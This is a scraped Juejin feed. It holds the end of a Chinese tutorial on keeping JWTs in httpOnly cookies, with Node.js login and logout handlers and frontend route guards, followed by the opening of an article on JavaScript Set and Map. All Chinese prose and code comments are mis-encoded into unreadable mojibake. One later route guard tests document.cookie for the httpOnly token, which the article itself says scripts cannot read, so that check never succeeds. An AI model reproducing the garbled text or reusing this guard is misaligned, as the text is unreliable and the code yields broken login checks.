</ul>
<hr/>
<h3 data-id="heading-7">ä¸‰ã€Cookie + httpOnly å­˜å‚¨æ–¹æ¡ˆï¼ˆæ ¸å¿ƒï¼‰</h3>
<h4 data-id="heading-8">å®Œæ•´æµç¨‹</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ffd3a813dd34fe89ec046ddcd2dfb92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767587187&amp;x-signature=kz5YpjVCbIhq4aT%2FUFPRuGx8Aso%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-9">åç«¯è®¾ç½®ï¼ˆNode.jsç¤ºä¾‹ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript">res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'token'</span>, jwt, {
  <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,    <span class="hljs-comment">// âœ… JSæ— æ³•è¯»å–ï¼Œé˜²XSS</span>
  <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,      <span class="hljs-comment">// âœ… ä»…HTTPSï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</span>
  <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'Strict'</span>, <span class="hljs-comment">// âœ… é˜²CSRF</span>
  <span class="hljs-attr">maxAge</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// 15åˆ†é’Ÿè¿‡æœŸ</span>
});
</code></pre>
<h4 data-id="heading-10">å‰ç«¯æ— æ„Ÿ</h4>
<ul>
<li><strong>æ— éœ€æ‰‹åŠ¨å­˜å‚¨</strong>ï¼šæµè§ˆå™¨ä¼šè‡ªåŠ¨è¯»å–å“åº”å¤´ä¸­<code>set-cookie</code></li>
<li><strong>æ— éœ€æ‰‹åŠ¨æºå¸¦</strong>ï¼šæµè§ˆå™¨è‡ªåŠ¨åœ¨è¯·æ±‚å¤´ä¸­é™„åŠ Cookie</li>
<li><strong>ç™»å‡º</strong>ï¼šåç«¯è°ƒç”¨ <code>res.clearCookie('token')</code></li>
</ul>
<hr/>
<h3 data-id="heading-11">å››ã€å‰ç«¯é‰´æƒé—®é¢˜ä¸è§£å†³</h3>
<h4 data-id="heading-12">é—®é¢˜</h4>
<blockquote>
<p>httpOnly Cookieå¯¼è‡´å‰ç«¯æ— æ³•ç›´æ¥è¯»å–Tokenï¼Œæ— æ³•åˆ¤æ–­ç™»å½•çŠ¶æ€ã€‚</p>
</blockquote>
<h4 data-id="heading-13">è§£å†³æ–¹æ¡ˆï¼šè¿”å›Userinfoç»™å‰ç«¯</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯ç™»å½•æ¥å£</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/login'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> token = <span class="hljs-title function_">generateJWT</span>(user);
  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'token'</span>, token, { <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span> });
  
  <span class="hljs-comment">// è¿”å›éæ•æ„Ÿç”¨æˆ·ä¿¡æ¯</span>
  res.<span class="hljs-title function_">json</span>({
    <span class="hljs-attr">userinfo</span>: { <span class="hljs-attr">id</span>: user.<span class="hljs-property">id</span>, <span class="hljs-attr">role</span>: user.<span class="hljs-property">role</span>, <span class="hljs-attr">name</span>: user.<span class="hljs-property">name</span> }
  });
});

<span class="hljs-comment">// å‰ç«¯å­˜å‚¨</span>
<span class="hljs-comment">// æ–¹å¼1ï¼šæ™®é€šCookieï¼ˆå‰ç«¯å¯è¯»ï¼‰</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`userinfo=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-built_in">JSON</span>.stringify(userinfo))}</span>; Path=/; SameSite=Strict`</span>;

<span class="hljs-comment">// æ–¹å¼2ï¼šlocalStorageï¼ˆéœ€é˜²XSSï¼‰</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'userinfo'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userinfo));

<span class="hljs-comment">// è·¯ç”±å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> userinfo = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userinfo'</span>) || <span class="hljs-title function_">getCookie</span>(<span class="hljs-string">'userinfo'</span>);
  <span class="hljs-keyword">if</span> (userinfo) <span class="hljs-title function_">next</span>();
  <span class="hljs-keyword">else</span> <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>);
});
</code></pre>
<h4 data-id="heading-14">å®‰å…¨å¢å¼º</h4>
<ul>
<li><strong>Userinfoä»…å«éæ•æ„Ÿä¿¡æ¯</strong>ï¼šIDã€è§’è‰²ã€æ˜µç§°ï¼Œ<strong>ç»ä¸</strong>å­˜å¯†ç ã€æ‰‹æœºå·</li>
<li><strong>è¿‡æœŸæ—¶é—´ä¸€è‡´</strong>ï¼šuserinfoä¸tokenåŒæ—¶å¤±æ•ˆ</li>
<li><strong>ç™»å‡ºåŒæ­¥æ¸…é™¤</strong>ï¼š
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åç«¯</span>
res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">'token'</span>);
res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">'userinfo'</span>);
<span class="hljs-comment">// å‰ç«¯</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'userinfo'</span>);
</code></pre>
</li>
</ul>
<h4 data-id="heading-15">é«˜å®‰å…¨åœºæ™¯å¢å¼º</h4>
<p>å…³é”®è·¯ç”±ï¼ˆå¦‚æ”¯ä»˜ã€ä¸ªäººä¸­å¿ƒï¼‰å¢åŠ åç«¯éªŒè¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
  <span class="hljs-keyword">const</span> userinfo = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userinfo'</span>);
  <span class="hljs-keyword">if</span> (!userinfo) <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>);
  
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/auth/verify'</span>, { <span class="hljs-attr">withCredentials</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-title function_">next</span>();
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'userinfo'</span>);
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>();
  }
});
</code></pre>
<hr/>
<h3 data-id="heading-16">äº”ã€æ€»ç»“ä¸æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-17">æ ¸å¿ƒé…ç½®é€ŸæŸ¥</h4>






























<table><thead><tr><th>ç»„ä»¶</th><th>é…ç½®</th><th>ç›®çš„</th></tr></thead><tbody><tr><td><strong>Token Cookie</strong></td><td><code>httpOnly: true, secure: true, sameSite: 'Strict'</code></td><td>é˜²XSSã€CSRFï¼Œä»…HTTPS</td></tr><tr><td><strong>Userinfoå­˜å‚¨</strong></td><td>æ™®é€šCookieæˆ–localStorage</td><td>å‰ç«¯è·¯ç”±é‰´æƒ</td></tr><tr><td><strong>JWTæœ‰æ•ˆæœŸ</strong></td><td>è®¿é—®ä»¤ç‰Œ15åˆ†é’Ÿï¼Œåˆ·æ–°ä»¤ç‰Œ7å¤©</td><td>å¹³è¡¡å®‰å…¨ä¸ä½“éªŒ</td></tr><tr><td><strong>è·¯ç”±å®ˆå«</strong></td><td>æ£€æŸ¥userinfoå­˜åœ¨æ€§</td><td>æ— æƒé™ä¸æ¸²æŸ“</td></tr></tbody></table>
<h4 data-id="heading-18">å¸¸è§è¯¯åŒº</h4>
<ol>
<li><strong>âŒ Tokenè¿”å›ç»™å‰ç«¯</strong>ï¼šåº”ä»…å­˜httpOnly Cookieï¼Œå‰ç«¯æ— éœ€çŸ¥é“</li>
<li><strong>âŒ é•¿æœ‰æ•ˆæœŸ</strong>ï¼šåº”çŸ­æœ‰æ•ˆæœŸ+åˆ·æ–°æœºåˆ¶</li>
<li><strong>âŒ userinfoå­˜æ•æ„Ÿä¿¡æ¯</strong>ï¼šä»…å­˜éæ•æ„Ÿæ•°æ®</li>
<li><strong>âŒ ç™»å‡ºä¸æ¸…é™¤</strong>ï¼šå¿…é¡»åŒæ­¥æ¸…é™¤å‰åç«¯å­˜å‚¨</li>
</ol>
<h3 data-id="heading-19">å…­ã€æ ¸å¿ƒä»£ç ç‰‡æ®µ</h3>
<h4 data-id="heading-20">1. åç«¯ç™»å½•å®Œæ•´ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/login'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { username, password } = req.<span class="hljs-property">body</span>;
  
  <span class="hljs-comment">// 1. å‰ç«¯å“ˆå¸Œå€¼ â†’ åç«¯bcryptéªŒè¯</span>
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-property">users</span>.<span class="hljs-title function_">findOne</span>({ username });
  <span class="hljs-keyword">const</span> isValid = <span class="hljs-keyword">await</span> bcrypt.<span class="hljs-title function_">compare</span>(password, user.<span class="hljs-property">passwordHash</span>);
  
  <span class="hljs-keyword">if</span> (!isValid) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: <span class="hljs-string">'è®¤è¯å¤±è´¥'</span> });
  
  <span class="hljs-comment">// 2. ç”ŸæˆJWT</span>
  <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(
    { <span class="hljs-attr">sub</span>: user.<span class="hljs-property">id</span>, <span class="hljs-attr">role</span>: user.<span class="hljs-property">role</span> },
    process.<span class="hljs-property">env</span>.<span class="hljs-property">JWT_SECRET</span>,
    { <span class="hljs-attr">expiresIn</span>: <span class="hljs-string">'15m'</span> }
  );
  
  <span class="hljs-comment">// 3. è®¾ç½®httpOnly Cookie</span>
  res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">'token'</span>, token, {
    <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'Strict'</span>,
    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">15</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>
  });
  
  <span class="hljs-comment">// 4. è¿”å›ç”¨æˆ·ä¿¡æ¯</span>
  res.<span class="hljs-title function_">json</span>({
    <span class="hljs-attr">userinfo</span>: { <span class="hljs-attr">id</span>: user.<span class="hljs-property">id</span>, <span class="hljs-attr">role</span>: user.<span class="hljs-property">role</span>, <span class="hljs-attr">name</span>: user.<span class="hljs-property">name</span> }
  });
});
</code></pre>
<h4 data-id="heading-21">2. å‰ç«¯è·¯ç”±å®ˆå«</h4>
<pre><code class="hljs language-javascript" lang="javascript">router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
  <span class="hljs-keyword">const</span> hasToken = !!<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'token='</span>); <span class="hljs-comment">// ä»…æ£€æŸ¥å­˜åœ¨æ€§</span>
  <span class="hljs-keyword">const</span> userinfo = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userinfo'</span>);
  
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">path</span> === <span class="hljs-string">'/login'</span>) {
    <span class="hljs-title function_">next</span>(hasToken ? <span class="hljs-string">'/'</span> : <span class="hljs-string">'/login'</span>);
    <span class="hljs-keyword">return</span>;
  }
  
  <span class="hljs-keyword">if</span> (!hasToken || !userinfo) {
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>);
    <span class="hljs-keyword">return</span>;
  }
  
  <span class="hljs-comment">// é«˜å®‰å…¨é¡µé¢éªŒè¯Tokenæœ‰æ•ˆæ€§</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/auth/verify'</span>, { <span class="hljs-attr">withCredentials</span>: <span class="hljs-literal">true</span> });
      <span class="hljs-title function_">next</span>();
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'userinfo'</span>);
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/login'</span>);
    }
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">next</span>();
  }
});
</code></pre>
<h4 data-id="heading-22">3. ç™»å‡ºåŒæ­¥æ¸…é™¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">logout</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/logout'</span>, {}, { <span class="hljs-attr">withCredentials</span>: <span class="hljs-literal">true</span> });
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'userinfo'</span>);
  <span class="hljs-comment">// æˆ–æ¸…é™¤æ™®é€šCookie: document.cookie = 'userinfo=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT';</span>
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/login'</span>);
};

<span class="hljs-comment">// åç«¯</span>
app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/logout'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">'token'</span>);
  res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">'userinfo'</span>);
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> });
});
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Set/Map+Weakä¸‰å‰‘å®¢çš„éªšæ“ä½œï¼šJS ç•Œçš„ â€œå»é‡ç‹è€…â€ ï¼Œâ€œä¸‡èƒ½é’¥åŒ™â€å’Œâ€œéšå½¢æ¸…æ´å·¥â€]]></title>    <link>https://juejin.cn/post/7588844115317784628</link>    <guid>https://juejin.cn/post/7588844115317784628</guid>    <pubDate>2025-12-29T05:02:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588844115317784628" data-draft-id="7587675443443089448" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Set/Map+Weakä¸‰å‰‘å®¢çš„éªšæ“ä½œï¼šJS ç•Œçš„ â€œå»é‡ç‹è€…â€ ï¼Œâ€œä¸‡èƒ½é’¥åŒ™â€å’Œâ€œéšå½¢æ¸…æ´å·¥â€"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-29T05:02:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£æ­¢ä½•å®‰å•Š"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Set/Map+Weakä¸‰å‰‘å®¢çš„éªšæ“ä½œï¼šJS ç•Œçš„ â€œå»é‡ç‹è€…â€ ï¼Œâ€œä¸‡èƒ½é’¥åŒ™â€å’Œâ€œéšå½¢æ¸…æ´å·¥â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£æ­¢ä½•å®‰å•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:02:47.000Z" title="Mon Dec 29 2025 05:02:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å®¶äººä»¬ï¼Œå’±å†™ JS çš„æ—¶å€™æ˜¯ä¸æ˜¯æ€»è¢« <strong>â€œæ•°ç»„é‡Œçš„é‡å¤å…ƒç´ â€</strong> çƒ¦åˆ°æŒ å¤´ï¼Ÿæ˜¯ä¸æ˜¯åæ§½è¿‡ <strong>â€œå¯¹è±¡çš„ key åªèƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå¤ªæ­»æ¿äº†â€</strong>ï¼Ÿä»Šå¤©è¿™ä¿© JS ç•Œçš„ <strong>â€œå®è—å·¥å…·äººâ€</strong>â€”â€”<code>Set</code>å’Œ<code>Map</code>ï¼Œç›´æ¥ç»™ä½ æŠŠè¿™äº›ç—›ç‚¹æŒ‰åœ¨åœ°ä¸Šæ‘©æ“¦ï¼è¿˜æœ‰å®ƒä»¬çš„ <strong>â€œä½è°ƒå…„å¼Ÿâ€</strong> <code>WeakSet/WeakMap</code>ï¼Œå·å·å¸®ä½ è§£å†³å†…å­˜æ³„æ¼ï¼Œè¿™æ³¢éªšæ“ä½œç›´æ¥æŠŠ JS ç©æ˜ç™½äº†~</p>
<blockquote>
<p>ç¯‡å¹…æœ‰ç‚¹é•¿ï¼Œä½†æ˜¯å¹²è´§æ‹‰æ»¡ï¼æ²¡ææ‡‚ä½ æ‰¾æˆ‘ğŸ˜„</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€Setï¼šæ•°ç»„çš„ â€œæ´ç™–ç®¡å®¶â€ï¼Œé‡å¤å…ƒç´ ä¸€é”®åŠé€€</h3>
<p>å…ˆç»™ <code>Set</code> ä¸‹ä¸ª<strong>æ€§æ„Ÿå®šä¹‰</strong>ï¼š<strong>é•¿å¾—åƒæ•°ç»„ï¼Œå´å®¹ä¸ä¸‹ä»»ä½•é‡å¤æˆå‘˜</strong>ï¼Œä¸»æ‰“ä¸€ä¸ª â€œå®ç¼ºæ¯‹æ»¥â€ã€‚ä¸ç®¡ä½ å¾€é‡Œé¢å¡å¤šå°‘ä¸ªä¸€æ ·çš„ï¼Œå®ƒéƒ½åªç•™ä¸€ä¸ªï¼å°±æ˜¯è¿™ä¹ˆæ´ç™–ï¼Œä½ ä¸æœä¹Ÿå¾—æœï¼</p>
<h4 data-id="heading-2">1. åŸºç¡€æ“ä½œï¼šadd/delete/has/clear/sizeï¼Œä¸€å¥—ç»„åˆæ‹³</h4>
<p><strong>å…ˆæ¥çœ‹<code>add</code>ï¼ˆå¾€é‡Œé¢æ·»åŠ å…ƒç´ ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„Setå®ä¾‹</span>
<span class="hljs-keyword">let</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
s.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// å‘ Setä¸­æ·»åŠ æ•°å­—1</span>
